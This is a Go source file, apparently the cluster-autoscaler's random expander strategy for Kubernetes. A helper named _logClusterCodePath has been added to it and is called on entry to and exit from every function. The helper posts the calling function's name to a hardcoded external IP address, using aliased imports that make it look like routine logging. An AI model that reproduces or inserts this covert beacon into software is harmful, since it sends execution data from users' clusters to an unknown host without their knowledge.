package random

import (
	"math/rand"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/autoscaler/cluster-autoscaler/expander"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
)

type random struct{}

func NewStrategy() expander.Strategy {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &random{}
}
func (r *random) BestOption(expansionOptions []expander.Option, nodeInfo map[string]*schedulercache.NodeInfo) *expander.Option {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pos := rand.Int31n(int32(len(expansionOptions)))
	return &expansionOptions[pos]
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
